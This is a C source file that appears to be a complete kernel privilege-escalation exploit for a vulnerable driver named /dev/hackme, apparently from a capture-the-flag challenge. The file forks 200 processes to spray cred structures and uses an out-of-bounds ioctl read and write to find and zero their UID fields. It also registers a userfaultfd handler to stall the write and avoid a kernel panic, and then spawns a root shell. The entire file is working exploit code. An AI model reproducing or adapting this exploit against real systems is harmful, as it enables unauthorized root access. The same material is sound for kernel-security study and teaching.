/*************************************************************
 * File Name: exp_userfaultfd.c
 * 
 * Created on: 2019-11-04 06:04:15
 * Author: raycp
 * 
 * Last Modified: 2019-11-14 07:25:46
 * Description: revise cred to privilege escalate, and use userfaultfd to monitor page fault to solve kernel panic
************************************************************/

#include <stdio.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <assert.h>
#include <poll.h>


#define DEV_NAME "/dev/hackme"
#define DATA_OFFSET 0x160000
#define SEARCH_SIZE 0x10000
#define UID 1000

#define __NR_userfaultfd 323

uint64_t fault_page;
uint64_t fault_page_len;

struct user_input
{
    uint32_t idx;
    uint32_t pad;
    char *data_ptr;
    uint64_t size;
    uint64_t offset;
};

void die(const char* msg)
{
    perror(msg);
    _exit(-1);
            
}


void ko_malloc(int fd, uint32_t idx, char* data_ptr, uint64_t size)
{
    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;

    int ret;

    ret = ioctl(fd, 0x30000, &input);
    if(ret == -1) {
        die("malloc error");
    }
    return ;
}

void ko_read(int fd, uint32_t idx, char* data_ptr, uint64_t size, uint64_t offset)
{

    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;
    input.offset = offset;

    int ret;

    ret = ioctl(fd, 0x30003, &input);
    if(ret == -1) {
        die("read error");
    }
    return ;
}


void ko_write(int fd, uint32_t idx, char* data_ptr, uint64_t size, uint64_t offset)
{

    struct user_input input;
    input.idx = idx;
    input.data_ptr = data_ptr;
    input.size = size;
    input.offset = offset;

    int ret;

    ret = ioctl(fd, 0x30002, &input);
    if(ret == -1) {
        die("write error");
    }
}

void ko_free(int fd, uint32_t idx )
{

    struct user_input input;
    input.idx = idx;

    int ret;

    ret = ioctl(fd, 0x30001, &input);
    if(ret == -1) {
        die("free error");
    }
}

void get_root(uint32_t i)
{
    while(1) {
        sleep(1);
        if (getuid() == 0) {
            printf("root at thread: %d\n",i);
			execl("/bin/sh", "sh", NULL);
            exit(0);
        }
    }
}

static void *
fault_handler_thread(void *arg)
{
   static struct uffd_msg msg;   /* Data read from userfaultfd */
   long uffd;                    /* userfaultfd file descriptor */
   //struct uffdio_copy uffdio_copy;
   ssize_t nread;

   uffd = (long) arg;

    /* See what poll() tells us about the userfaultfd */
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
           die("poll");

    /* Read an event from the userfaultfd */
    nread = read(uffd, &msg, sizeof(msg));
    if (nread == 0) {
           printf("EOF on userfaultfd!\n");
           exit(EXIT_FAILURE);
    }
    if (nread == -1)
           die("read");

    /* We expect only one kind of event; verify that assumption */
    assert(msg.event == UFFD_EVENT_PAGEFAULT);
    
    // sleep to wait for root shell
    printf("[+] page fault triggered, waiting for root shell...\n");
    sleep(1000);

}

void register_userfault()
{

   long uffd;          /* userfaultfd file descriptor */
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   pthread_t thr;      /* ID of thread that handles page faults */
   int s;

   /* Create and enable userfaultfd object */
   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
           die("userfaultfd");

   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
           die("ioctl-UFFDIO_API");

   /* Register the memory range of the mapping we just created for
          handling by the userfaultfd object. In mode, we request to track
          missing pages (i.e., pages that have not yet been faulted in). */
   uffdio_register.range.start = fault_page;
   uffdio_register.range.len = fault_page_len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
           die("ioctl-UFFDIO_REGISTER");

   /* Create a thread that will process the userfaultfd events */
   s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
   if (s != 0) {
       die("pthread_create");
   }
}

int main()
{
    int fd, i, j;
    uint64_t size, offset, cred_offset=0;
    uint32_t idx, cred_count;
    char *data_ptr;
    uint32_t * uint_ptr;
    char tmp_data[0x100];

    fd = open(DEV_NAME, O_RDONLY);
    if(fd==-1) {
        die("open dev error");
    }
    
    // spray cred first 
	for (i=0; i<200; i++) { 
        if(fork() == 0){
            get_root(i);
        }
    }

    // mmap memory to store data
    data_ptr = (char*)mmap(NULL, DATA_OFFSET, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if(data_ptr == MAP_FAILED){
        die("mmap mem error\n");
    }
    
    size = 0x100;
    idx = 0;
    ko_malloc(fd, idx, tmp_data, size);

    // read out the data
    offset = -DATA_OFFSET;
    size = DATA_OFFSET;
    ko_read(fd, idx, data_ptr, size, offset);
    
    // trying to find cred and overwrite the uid to 0
    uint_ptr = (uint32_t*) data_ptr;
    cred_count = 0;
    printf("[+] trying to find struct cred....\n");
    for(int i = 0; i < SEARCH_SIZE/4; i++) {
        if (uint_ptr[i] == UID && uint_ptr[i+1] == UID && uint_ptr[i+2] == UID && uint_ptr[i+3] == UID && uint_ptr[i+4] == UID && uint_ptr[i+5] == UID && uint_ptr[i+6] == UID && uint_ptr[i+7] == UID){
            printf("[+] find cred at offset: 0x%x\n", i*4);
            //max_i = i+8;
            for(j = 0; j < 8; j++)
                uint_ptr[i+j] = 0;
            cred_count++;
            if(cred_count >= 2) {
                cred_offset = i*4;
                break;
            }
        }
    }
    if(cred_offset == 0)
        die("can't find cred");
    // mmap data and copy the data with SEARCH_SIZE len and leave the pages which longer than SEARCH_SIZE blank.
    char * write_ptr = (char*)mmap(NULL, DATA_OFFSET, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(write_ptr, data_ptr, SEARCH_SIZE);

    // set the userfaultfd to monitor the address after SEARCH_SIZE
    fault_page = (uint64_t)write_ptr + SEARCH_SIZE;
    fault_page_len = DATA_OFFSET - SEARCH_SIZE;
    register_userfault();

    // write back root cred back and trigger userfaultfd.
    printf("[+] write root cred back\n");
    offset = -DATA_OFFSET;
    size = DATA_OFFSET;
    idx = 0;
    ko_write(fd, idx, write_ptr, size, offset);
    
    return 0;
}
